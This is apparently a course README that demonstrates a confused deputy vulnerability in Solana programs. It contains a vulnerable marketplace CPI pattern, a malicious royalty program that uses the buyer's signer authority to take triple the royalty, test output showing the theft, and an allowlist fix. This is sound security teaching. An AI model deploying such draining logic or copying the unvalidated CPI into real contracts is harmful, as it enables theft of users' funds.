# Exercise 9: Confused Deputy Attack Demonstration

This exercise demonstrates the **Confused Deputy Attack** vulnerability in Solana programs that make arbitrary Cross-Program Invocations (CPIs) without proper validation.

## 🚨 The Vulnerability

The **Confused Deputy Attack** occurs when a program acts as an intermediary (deputy) that can be "confused" into performing unintended actions on behalf of a user. In Solana, this happens when:

1. A program makes CPIs to arbitrary external programs provided by users
2. The CPI propagates the caller's signing authority to the external program
3. The external program can abuse this authority to perform malicious actions

### Key Security Flaw:
- **No validation** of the `royalty_program` parameter
- **Unconstrained CPI** to any program provided by the user
- **Privilege propagation** - buyer's signing authority is passed to arbitrary programs

## 🔍 Vulnerability Breakdown

### Vulnerable Code Pattern:
```rust
pub fn purchase_nft_with_royalties<'info>(
    ctx: Context<'_, '_, '_, 'info, PurchaseNftWithRoyalties<'info>>,
    royalty_percentage: u8,
) -> Result<()> {
    // ... marketplace logic ...
    
    // 🚨 VULNERABILITY: No validation of royalty_program
    let royalty_instruction = Instruction {
        program_id: ctx.accounts.royalty_program.key(), // ⚠️ Arbitrary program!
        accounts: vec![
            AccountMeta::new(ctx.accounts.buyer.key(), true), // ⚠️ Buyer as signer!
            // ... other accounts
        ],
        data: instruction_data,
    };

    // 🚨 DANGEROUS CPI: Calling arbitrary program with buyer's authority
    anchor_lang::solana_program::program::invoke(
        &royalty_instruction,
        &[
            ctx.accounts.buyer.to_account_info(), // ⚠️ Signer privileges!
            // ... other accounts
        ],
    )?;
}
```

### Attack Scenario:
1. **Legitimate marketplace** expects a 10% royalty (0.1 SOL)
2. **Attacker provides malicious program** as `royalty_program` parameter
3. **Marketplace calls malicious program** with buyer's signing authority
4. **Malicious program steals 3x** the expected amount (0.3 SOL instead of 0.1 SOL)

## 💰 Real Attack Demonstration

### Malicious Royalty Program Logic:
```rust
pub fn distribute_royalties(
    ctx: Context<DistributeRoyalties>,
    royalty_amount: u64,
) -> Result<()> {
    let buyer = &ctx.accounts.buyer;
    
    if buyer.is_signer {
        // 🚨 MALICIOUS: Take 3x the expected royalty amount
        let actual_amount_to_take = royalty_amount * 3;
        
        // Transfer extra funds using buyer's authority
        let transfer_instruction = system_instruction::transfer(
            buyer.key, 
            escrow.key, 
            actual_amount_to_take
        );
        
        // This succeeds because buyer is a signer!
        invoke(&transfer_instruction, &[buyer, escrow, system_program])?;
    }
    
    Ok(())
}
```

## ✅ The Fix: Whitelist Validation

### Secure Code Pattern:
```rust
// 🛡️ TRUSTED PROGRAM WHITELIST
const TRUSTED_ROYALTY_PROGRAM: &str = "8GQBYWVbgsZvem5Vef4SiL5YmD1pgAkxMnB5NBydF5HQ";

#[derive(Accounts)]
pub struct PurchaseNftWithRoyaltiesSafe<'info> {
    // ... other accounts ...
    
    /// 🛡️ VALIDATED ROYALTY PROGRAM - Only trusted program accepted
    #[account(
        constraint = royalty_program.key().to_string() == TRUSTED_ROYALTY_PROGRAM 
        @ MarketplaceError::UntrustedRoyaltyProgram
    )]
    pub royalty_program: AccountInfo<'info>,
}

pub fn purchase_nft_with_royalties_safe<'info>(
    ctx: Context<'_, '_, '_, 'info, PurchaseNftWithRoyaltiesSafe<'info>>,
    royalty_percentage: u8,
) -> Result<()> {
    // ✅ Program ID is validated by Anchor constraints
    // ✅ Only trusted programs can be called
    
    // Safe CPI to validated program
    let royalty_instruction = Instruction {
        program_id: ctx.accounts.royalty_program.key(), // ✅ Validated!
        // ... rest of implementation
    };
}
```

## 🎯 Test Results

The vulnerability demonstration shows:

1. **Expected payment**: 1.1 SOL (1 SOL NFT + 0.1 SOL royalty)
2. **Actual payment**: 1.3 SOL (1 SOL NFT + 0.3 SOL stolen by malicious program)
3. **Extra theft**: 0.2 SOL (3x royalty multiplier attack)

### Test Output:
```
🚨 THEFT ANALYSIS:
   Expected TOTAL payment: 1.1 SOL (NFT price + royalty)
   Actual TOTAL paid by buyer: 1.3 SOL
   💰 EXTRA STOLEN: 0.2 SOL
   🚨 PAYMENT MULTIPLIER: 1.18x the expected total!
   📊 ROYALTY BREAKDOWN:
      Expected royalty: 0.1 SOL
      Actual royalty charged: 0.3 SOL
      Royalty theft multiplier: 3.0x
```

## 🛡️ Prevention Guidelines

### 1. **Program Validation**
- Always validate external program IDs against a whitelist
- Use Anchor constraints for compile-time validation
- Never accept arbitrary program IDs from users

### 2. **Authority Management**
- Minimize signing authority propagation in CPIs
- Consider using Program Derived Addresses (PDAs) for intermediary operations
- Validate the necessity of signer privileges in external calls

### 3. **Testing Strategy**
- Test with malicious programs to verify security
- Implement comprehensive integration tests
- Use property-based testing for edge cases

## 🧪 Running the Demonstration

```bash
# Navigate to exercise directory
cd lecture_9_files/exercise_9

# Build and deploy programs
anchor build
anchor deploy

# Run the vulnerability demonstration
anchor test --skip-local-validator

# Alternative: Run with local validator
solana-test-validator --reset
anchor test
```

## 📚 Related Vulnerabilities

- **Arbitrary CPI**: Calling untrusted external programs
- **Privilege Escalation**: Misuse of signing authority in CPIs
- **Account Substitution**: Providing malicious accounts to trusted programs

## 🔗 Further Reading

- [Neodyme's Confused Deputy Blog Post](https://blog.neodyme.io/posts/solana_common_pitfalls/)
- [Solana CPI Security Best Practices](https://docs.solana.com/developing/programming-model/calling-between-programs)
- [Anchor Security Documentation](https://www.anchor-lang.com/docs/security)

---

**⚠️ Important**: This code is for educational purposes only. Never deploy without proper security review and comprehensive testing.